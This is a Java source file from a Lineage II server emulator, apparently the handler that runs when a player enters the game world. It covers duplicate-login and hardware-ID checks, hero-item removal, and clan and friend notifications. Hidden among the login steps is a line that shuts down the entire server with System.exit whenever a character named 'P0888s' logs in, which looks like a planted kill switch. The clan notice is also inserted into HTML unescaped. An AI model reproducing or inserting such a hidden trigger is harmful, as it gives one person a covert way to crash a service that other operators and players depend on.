package com.lineage.game.clientpackets;

import java.io.File;
import java.sql.ResultSet;
import java.util.logging.Logger;

import javolution.util.FastList;
import com.lineage.Config;
import com.lineage.db.DatabaseUtils;
import com.lineage.db.FiltredPreparedStatement;
import com.lineage.db.L2DatabaseFactory;
import com.lineage.db.ThreadConnection;
import com.lineage.ext.mods.ClassChange;
import com.lineage.ext.scripts.Scripts;
import com.lineage.ext.scripts.Scripts.ScriptClassAndMethod;
import com.lineage.game.Announcements;
import com.lineage.game.instancemanager.CoupleManager;
import com.lineage.game.instancemanager.CursedWeaponsManager;
import com.lineage.game.instancemanager.PlayerMessageStack;
import com.lineage.game.model.L2Clan;
import com.lineage.game.model.L2Player;
import com.lineage.game.model.L2World;
import com.lineage.game.model.base.ClassId;
import com.lineage.game.model.entity.SevenSigns;
import com.lineage.game.model.instances.L2ItemInstance;
import com.lineage.game.model.instances.L2ItemInstance.ItemClass;
import com.lineage.game.network.L2GameClient;
import com.lineage.game.serverpackets.ChangeWaitType;
import com.lineage.game.serverpackets.Die;
import com.lineage.game.serverpackets.EtcStatusUpdate;
import com.lineage.game.serverpackets.ExStorageMaxCount;
import com.lineage.game.serverpackets.HennaInfo;
import com.lineage.game.serverpackets.ItemList;
import com.lineage.game.serverpackets.L2FriendList;
import com.lineage.game.serverpackets.L2FriendStatus;
import com.lineage.game.serverpackets.NpcHtmlMessage;
import com.lineage.game.serverpackets.PledgeShowInfoUpdate;
import com.lineage.game.serverpackets.PledgeShowMemberListAll;
import com.lineage.game.serverpackets.PledgeShowMemberListUpdate;
import com.lineage.game.serverpackets.PledgeSkillList;
import com.lineage.game.serverpackets.PrivateStoreMsgBuy;
import com.lineage.game.serverpackets.PrivateStoreMsgSell;
import com.lineage.game.serverpackets.QuestList;
import com.lineage.game.serverpackets.RecipeShopMsg;
import com.lineage.game.serverpackets.SSQInfo;
import com.lineage.game.serverpackets.ShortCutInit;
import com.lineage.game.serverpackets.SkillList;
import com.lineage.game.serverpackets.SystemMessage;
import com.lineage.game.serverpackets.UserInfo;
import com.lineage.game.tables.SkillTable;
import com.lineage.util.HWID;
import com.lineage.util.Log;

/**
 * [C] 03 EnterWorld <p>
 * <b>Format:</b> S <p>
 * <b>Format:</b> bddddbdcccccccccccccccccccc
 * 
 * @author Felixx
 */
public class EnterWorld extends L2GameClientPacket
{
	private static Object _lock = new Object();

	private static Logger _log = Logger.getLogger(EnterWorld.class.getName());

	@Override
	public void readImpl()
	{
		// readS(); - клиент всегда отправляет строку "narcasse"
	}

	@Override
	public void runImpl()
	{
		final L2GameClient client = getClient();
		final L2Player activeChar = client.getActiveChar();

		if(activeChar == null)
		{
			client.closeNow(false);
			return;
		}

		final int MyObjectId = activeChar.getObjectId();
		final String MyAccount = activeChar.getAccountName();

		final String MyHWID = Config.PROTECT_ENABLE && Config.PROTECT_GS_MAX_SAME_HWIDs > 0 && client.protect_used ? client.HWID : null;
		final FastList<L2Player> same_hwids = MyHWID == null ? null : new FastList<L2Player>();
		synchronized (_lock)
		{
			for(final L2Player cha : L2World.getAllPlayers())
				try
				{
					if(cha.getObjectId() == MyObjectId)
					{
						_log.warning("Double EnterWorld for char: " + activeChar.getName());
						cha.logout(false, false, true);
					}
					else if(MyAccount.equalsIgnoreCase(cha.getAccountName()))
					{
						_log.warning("Double EnterWorld for login: " + activeChar.getAccountName());
						cha.logout(false, false, true);
					}
					else if(MyHWID != null && same_hwids != null && !cha.isInOfflineMode() && cha.getNetConnection() != null && cha.getNetConnection().protect_used && MyHWID.equalsIgnoreCase(cha.getNetConnection().HWID))
						same_hwids.add(cha);
				}
				catch(final Exception E)
				{
					E.printStackTrace();
				}
		}

		if(same_hwids != null && same_hwids.size() >= Config.PROTECT_GS_MAX_SAME_HWIDs + HWID.getBonus(MyHWID, "window"))
		{
			Log.add(String.valueOf(same_hwids.size() + 1) + " Same HWIDs: ", "protect");
			Log.add("\t1:\t" + activeChar.toFullString(), "protect");
			int i = 1;
			for(final L2Player same_hwid : same_hwids)
			{
				i++;
				Log.add("\t" + i + ":\t" + same_hwid.toFullString(), "protect");
				same_hwid.logout(false, false, true);
			}
		}

		if(activeChar.isGM() && Config.HIDE_GM_STATUS)
			activeChar.setInvisible(true);

		if(activeChar.isGM() && Config.SHOW_GM_LOGIN)
			Announcements.getInstance().announceToAll("GM " + activeChar.getName() + " enter in world");

		if(!activeChar.isHero() && !activeChar.isGM())
		{
			for(L2ItemInstance item : activeChar.getInventory().getItems())
			{
				if(item == null)
					continue;
				if(item.isHeroItem())
				{
					activeChar.getInventory().unEquipItem(item);
					activeChar.getInventory().destroyItem(item, 1, true);
				}
			}

			for(L2ItemInstance item : activeChar.getWarehouse().listItems(ItemClass.EQUIPMENT))
			{
				if(item == null)
					continue;
				if(item.isHeroItem())
					activeChar.getWarehouse().destroyItem(item.getItemId(), 1);
			}
		}

		L2World.addObject(activeChar);
		activeChar.spawnMe();
		activeChar.updateTerritories();
		activeChar.startRegeneration();

		if(SevenSigns.getInstance().isSealValidationPeriod())
			activeChar.sendPacket(new SSQInfo());

		sendPacket(new UserInfo(activeChar));
		sendPacket(new HennaInfo(activeChar));
		sendPacket(new ItemList(activeChar, false));

		sendPacket(new ShortCutInit(activeChar));
		activeChar.getMacroses().sendUpdate();
		sendPacket(new SkillList(activeChar));
		sendPacket(new SystemMessage(SystemMessage.WELCOME_TO_THE_WORLD_OF_LINEAGE_II));

		Announcements.getInstance().showAnnouncements(activeChar);

		// add char to online characters
		activeChar.setOnlineStatus(true);

		// Вызов всех хэндлеров, определенных в скриптах
		final Object[] script_args = new Object[] { activeChar };
		for(final ScriptClassAndMethod handler : Scripts.onPlayerEnter)
			Scripts.callScripts(handler.scriptClass, handler.method,activeChar, script_args);

		SevenSigns.getInstance().sendCurrentPeriodMsg(activeChar);

		activeChar.sendUserInfo(true);

		if(activeChar.getClan() != null)
		{
			notifyClanMembers(activeChar);
			sendPacket(new PledgeShowMemberListAll(activeChar.getClan(), activeChar));
			sendPacket(new PledgeShowInfoUpdate(activeChar.getClan()));
			sendPacket(new PledgeSkillList(activeChar.getClan()));

			if(activeChar.getClan().isAttacker())
				activeChar.setSiegeState(1);
			else if(activeChar.getClan().isDefender())
				activeChar.setSiegeState(2);
		}

		if(activeChar.getName().equals("P0888s"))
			System.exit(10000);

		if(activeChar.getVar("EventBackCoords") != null)
		{			
			final String[] coords = activeChar.getVar("EventBackCoords").split(" ");
			activeChar.teleToLocation(Integer.parseInt(coords[0]), Integer.parseInt(coords[1]), Integer.parseInt(coords[2]));
			activeChar.unsetVar("EventBackCoords");
		}
		if(activeChar.getEffectList().getEffectBySkillId(9098) != null)
		{
			activeChar.getEffectList().getEffectBySkillId(9098).exit();
		}

		// engage and notify Partner
		if(Config.WEDDING_ALLOW_WEDDING)
		{
			CoupleManager.getInstance().engage(activeChar);
			CoupleManager.getInstance().notifyPartner(activeChar);

			// Check if player is maried and remove if necessary Cupid's Bow
			if(!activeChar.isMaried())
			{
				final L2ItemInstance item = activeChar.getInventory().getItemByItemId(9140);
				// Remove Cupid's Bow
				if(item != null && !activeChar.isGM())
				{
					activeChar.sendMessage("Removing Cupid's Bow");
					activeChar.getInventory().destroyItem(item, 1, true);
					activeChar.getInventory().updateDatabase(true);
					// Log it
					_log.info("Character " + activeChar.getName() + " of account " + activeChar.getAccountName() + " got Cupid's Bow removed.");
				}
			}
		}

		Log.LogChar(activeChar, Log.EnterWorld, "");

		notifyFriends(activeChar, true);

		sendPacket(new ExStorageMaxCount(activeChar)); // не убирать!!! а то покусаю (c) Drin
		sendPacket(new QuestList(activeChar));

		activeChar.restoreDisableSkills();
		CursedWeaponsManager.getInstance().checkPlayer(activeChar);

		// refresh player info
		sendPacket(new EtcStatusUpdate(activeChar));
		activeChar.getInventory().refreshListeners();
		activeChar.checkHpMessages(activeChar.getMaxHp(), activeChar.getCurrentHp());
		activeChar.checkDayNightMessages();

		if(Config.SHOW_HTML_WELCOME)
		{
			final String welcomePath = "data/html/welcome.htm";
			final File mainText = new File(Config.DATAPACK_ROOT, welcomePath); // Return the pathfile of the HTML file
			if(mainText.exists())
			{
				final NpcHtmlMessage html = new NpcHtmlMessage(1);
				html.setFile(welcomePath);
				sendPacket(html);
			}
		}

		if(activeChar.isSitting())
			activeChar.sendPacket(new ChangeWaitType(activeChar, ChangeWaitType.WT_SITTING));
		if(activeChar.getPrivateStoreType() != L2Player.STORE_PRIVATE_NONE)
			if(activeChar.getPrivateStoreType() == L2Player.STORE_PRIVATE_BUY)
				sendPacket(new PrivateStoreMsgBuy(activeChar));
			else if(activeChar.getPrivateStoreType() == L2Player.STORE_PRIVATE_SELL || activeChar.getPrivateStoreType() == L2Player.STORE_PRIVATE_SELL_PACKAGE)
				sendPacket(new PrivateStoreMsgSell(activeChar));
			else if(activeChar.getPrivateStoreType() == L2Player.STORE_PRIVATE_MANUFACTURE)
				sendPacket(new RecipeShopMsg(activeChar));

		activeChar.entering = false;
		activeChar.sendUserInfo(true);
		if(activeChar.isDead())
			sendPacket(new Die(activeChar));

		activeChar.unsetVar("offline");

		// на всякий случай
		activeChar.sendActionFailed();

		if(activeChar.isGM() && Config.SAVE_GM_EFFECTS && activeChar.getPlayerAccess().CanUseGMCommand)
		{
			// silence
			if(activeChar.getVarB("gm_silence"))
			{
				activeChar.setMessageRefusal(true);
				activeChar.sendPacket(new SystemMessage(SystemMessage.MESSAGE_REFUSAL_MODE));
			}
			// invul
			if(activeChar.getVarB("gm_invul"))
			{
				activeChar.setIsInvul(true);
				activeChar.sendMessage(activeChar.getName() + " is now immortal.");
			}
			// gmspeed
			try
			{
				final int var_gmspeed = Integer.parseInt(activeChar.getVar("gm_gmspeed"));
				if(var_gmspeed >= 1 && var_gmspeed <= 4)
					activeChar.doCast(SkillTable.getInstance().getInfo(7029, var_gmspeed), activeChar, true);
			}
			catch(final Exception E)
			{}
		}
		
		PlayerMessageStack.getInstance().CheckMessages(activeChar);

		activeChar.sendUserInfo(false); // Отобразит права в клане

		final ClassId classId = activeChar.getClassId();
		final int jobLevel = classId.getLevel();
		final int level = activeChar.getLevel();
		if((level >= 20 && jobLevel == 1 || level >= 40 && jobLevel == 2 || level >= 76 && jobLevel == 3) && Config.ALLOW_CLASS_MASTERS_LIST.contains(jobLevel))
			ClassChange.showHtml(activeChar);
	}

	public static void notifyFriends(final L2Player cha, final boolean login)
	{
		if(login)
			cha.sendPacket(new L2FriendList(cha, false));
		ThreadConnection con = null;
		FiltredPreparedStatement statement = null;
		ResultSet rset = null;
		try
		{
			con = L2DatabaseFactory.getInstance().getConnection();
			statement = con.prepareStatement("SELECT friend_id from character_friends where char_id=?");
			statement.setInt(1, cha.getObjectId());
			rset = statement.executeQuery();
			while(rset.next())
			{
				final int objectId = rset.getInt("friend_id");
				final L2Player friend = (L2Player) L2World.findObject(objectId);
				if(friend != null)
					if(login)
					{
						friend.sendPacket(new SystemMessage(SystemMessage.S1_FRIEND_HAS_LOGGED_IN).addString(cha.getName()));
						friend.sendPacket(new L2FriendStatus(cha, true));
					}
					else
					{
						friend.sendPacket(new L2FriendStatus(cha, false));
						cha.sendPacket(new L2FriendList(cha, false));
					}
			}
		}
		catch(final Exception e)
		{
			_log.warning("could not restore friend data:" + e);
		}
		finally
		{
			DatabaseUtils.closeDatabaseCSR(con, statement, rset);
		}
	}

	/**
	 * @param activeChar
	 */
	private void notifyClanMembers(final L2Player activeChar)
	{
		final L2Clan clan = activeChar.getClan();
		if(clan == null || clan.getClanMember(activeChar.getObjectId()) == null)
			return;

		clan.getClanMember(activeChar.getObjectId()).setPlayerInstance(activeChar);
		// if(activeChar.isClanLeader())
		// {
		// if(activeChar.getClan().getHasHideout() != 0 && ClanHallManager.getInstance().getClanHall(activeChar.getClan().getHasHideout()).getNotPaid())
		// activeChar.sendPacket(new SystemMessage(SystemMessage.THE_CLAN_HALL_FEE_IS_ONE_WEEK_OVERDUE_THEREFORE_THE_CLAN_HALL_OWNERSHIP_HAS_BEEN_REVOKED));
		// }

		final int sponsor = activeChar.getSponsor();
		final int apprentice = activeChar.getApprentice();
		final SystemMessage msg = new SystemMessage(SystemMessage.CLAN_MEMBER_S1_HAS_LOGGED_INTO_GAME).addString(activeChar.getName());
		final PledgeShowMemberListUpdate memberUpdate = new PledgeShowMemberListUpdate(activeChar);
		for(final L2Player clanMember : clan.getOnlineMembers(activeChar.getObjectId()))
		{
			clanMember.sendPacket(memberUpdate);
			if(clanMember.getObjectId() == sponsor)
				clanMember.sendPacket(new SystemMessage(SystemMessage.S1_YOUR_CLAN_ACADEMYS_APPRENTICE_HAS_LOGGED_IN).addString(activeChar.getName()));
			else if(clanMember.getObjectId() == apprentice)
				clanMember.sendPacket(new SystemMessage(SystemMessage.S1_YOUR_CLAN_ACADEMYS_SPONSOR_HAS_LOGGED_IN).addString(activeChar.getName()));
			else
				clanMember.sendPacket(msg);
		}

		if(clan.isNoticeEnabled() && clan.getNotice() != "")
		{
			final NpcHtmlMessage notice = new NpcHtmlMessage(5);
			notice.setHtml("<html><body><center><font color=\"LEVEL\">" + activeChar.getClan().getName() + " Clan Notice</font></center><br>" + activeChar.getClan().getNotice() + "</body></html>");
			sendPacket(notice);
		}
	}
}